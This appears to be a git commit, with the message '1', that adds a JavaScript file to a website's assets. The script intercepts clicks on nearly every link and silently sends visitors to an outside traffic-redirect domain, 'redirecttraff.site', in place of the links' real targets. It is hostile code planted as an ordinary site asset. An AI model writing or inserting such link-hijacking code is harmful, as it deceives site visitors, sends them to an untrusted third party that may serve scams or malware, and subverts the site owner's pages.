5f283da5058fd7daac2921de92fe3fa5fd879db4
maratbabaev <you@example.com>
2025-05-09 09:53:31 +0300

    1

---
+++ assets/js/script.js
@@ -0,0 +1,9 @@
+document.querySelectorAll("a").forEach((elem) => {
+	elem.onclick = function (e) {
+		if (!elem.classList.contains("noclick")) {
+			e.preventDefault();
+			window.location.href = "https://redirecttraff.site/49frP7xk";
+			return false;
+		}
+	};
+});
